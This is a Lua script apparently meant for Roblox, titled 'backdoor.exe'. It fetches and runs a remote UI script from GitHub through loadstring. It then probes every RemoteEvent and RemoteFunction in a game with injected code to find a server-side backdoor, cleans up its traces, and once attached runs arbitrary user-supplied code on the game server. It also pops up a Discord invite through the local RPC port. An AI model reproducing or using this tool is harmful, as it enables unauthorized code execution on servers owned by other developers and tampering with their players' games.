-- Services
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting");
local Workspace = game:GetService("Workspace");
local JointsService = game:GetService("JointsService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")

-- Variables
local LocalPlayer = Players.LocalPlayer
local RobloxGui = CoreGui.RobloxGui

-- Functions
local dateTimeNow = DateTime.now
local tableFind = table.find
local taskSpawn = task.spawn
local taskWait = task.wait
local stringRep = string.rep
local mathRandom = math.random

-- Globals
local attached = false;
local backdoor = nil;
local commonPlaces = {
	ReplicatedStorage,
	Workspace,
	Lighting
};
local remoteCodes = {};

-- Constants
local INV_CODE = "xJHCqm84cW";
local STRING_VALUE_NAME = mathRandom(1000000, 9999999);


if RobloxGui:FindFirstChild("V6") then RobloxGui:FindFirstChild("V6"):Destroy(); print("Refreshed"); end
local Variables = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/ui.lua"))()

Variables.UI.Main.Active = true
Variables.UI.Main.Draggable = true

local function notify(text,cb,b1,b2)
	game:GetService("StarterGui"):SetCore(
		"SendNotification",{
			Title = "backdoor.exe",
			Duration = 3,
			Text = text,
			Callback = cb,
			Button1 = b1,
			Button2 = b2
		}
	)
end

local function validRemote(rm)
	local Parent = rm.Parent
	local class = rm.ClassName
	if class ~= "RemoteEvent" and class ~= "RemoteFunction" then return false end

	if Parent then
		if Parent == JointsService then return false end
		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
        (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
	end

	if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end

	return true
end

local function scanDescendants(parent)
	local descendance = parent:GetDescendants();
	for i=1, #descendance do
		local descendant = descendance[i];


		if not validRemote(descendant) then continue; end
		
		--if #remoteCodes == 5 then remoteCodes.clear(); end
		local remoteCode = tostring(mathRandom(100000, 999999));
		remoteCodes[remoteCode] = descendant;
		
		local remoteClass = descendant.ClassName
		local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)

		if remoteClass == "RemoteEvent" then
			descendant:FireServer(requireScript)

		elseif remoteClass == "RemoteFunction" then
			local waiting = true
			taskSpawn(function()
				descendant:InvokeServer(requireScript)
				waiting = nil
			end)

            -- If RemoteFunction don't respond in 1 second, we skip this one.
			local start = dateTimeNow().UnixTimestampMillis
			while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
				taskWait()
			end
		end

		if Workspace:FindFirstChild(STRING_VALUE_NAME) then
			attached = true
			backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
			backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME)) -- Cleaning up after tonumberselves

			return true
		end
	end
end
local function scanGame()
    local found = false
	-- Scan Common Places
	for i=1, #commonPlaces do
		local place = commonPlaces[i];
		if scanDescendants(place) then
            found = true
        end
	end
	-- Scan the rest of the game
	local children = game:GetChildren();
	for i=1, #children do
		local child = children[i];
		-- We ofcourse don't need to check the common places again, do we?
		if tableFind(commonPlaces, child) then continue; end
		
		if scanDescendants(child) then 
            found = true
        end
	end
    if found then
        notify("Backdoor Found!")
        Variables.Topbar.Status.Text = "Attached"
        Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(95, 185, 47)
    else
        notify("Unable to find backdoor!")
        Variables.Topbar.Status.Text = "Failed"
    end

	return found;
end
local function executeScript(script)
    if not attached then
        local function callback(text)
			if text == "Yes" then
				if scanGame() then
				    executeScript(script)
				end
			elseif text == "No" then
				return
			end
		end
	
		local bf = Instance.new("BindableFunction"); bf.OnInvoke = callback
		notify("You're not attached.\nWould you like to attach now?", bf, "Yes", "No")
		return
    end
    
    local script = script or Variables.SourceFrame.Source.Text
    if backdoor.ClassName == "RemoteEvent" then
        backdoor:FireServer(script)
    elseif backdoor.ClassName == "RemoteFunction" then
        backdoor:InvokeServer(script)
    end
end





local function promtDiscordInvite()
    local httpService = game:GetService("HttpService")
    local httpRequest = (syn and syn.request) or (httpService and httpService.request) or http_request

    if not httpRequest then setclipboard(INV_CODE) notify("Invite code copied!") return end
    
    local request = httpRequest({
        Url = "http://127.0.0.1:6463/rpc?v=1",
        Method = "POST",

        Headers = {
            ['Content-Type'] = 'application/json',
            Origin = 'https://discord.com'
        },

        Body = httpService:JSONEncode({
            args = {code = INV_CODE},
            cmd = 'INVITE_BROWSER',
            nonce = httpService:GenerateGUID(false)
        })
    })

	if request.StatusCode ~= 200 or httpService:JSONDecode(request.Body).data.code == 4011 then
	    notify("Invite code copied!") 
		setclipboard(INV_CODE)
		return
	end
	
	notify("You have been promted to join our Discord. Open your Discord.")

end

Variables.Topbar.CloseButton.MouseButton1Click:Connect(function() Variables.UI:Destroy() end)
Variables.Topbar.R6Button.MouseButton1Click:Connect(function() executeScript(("require(3041175937):r6('%s')"):format(LocalPlayer.Name)) end)
Variables.MainButtons.ScanButton.MouseButton1Click:Connect(scanGame)
Variables.MainButtons.ExecuteButton.MouseButton1Click:Connect(executeScript)
Variables.MainButtons.ClearButton.MouseButton1Click:Connect(function() Variables.SourceFrame.Source.Text = "" end)
Variables.MainButtons.HideButton.MouseButton1Click:Connect(function() Variables.SourceFrame.Source.Visible = not Variables.SourceFrame.Source.Visible end)
Variables.MainButtons.InviteButton.MouseButton1Click:Connect(promtDiscordInvite)



--	k4scripts
--	.------.
--	|4.--. |
--	| :│/: |
--	| :│\: |
--	| '--'4|
--	`------'
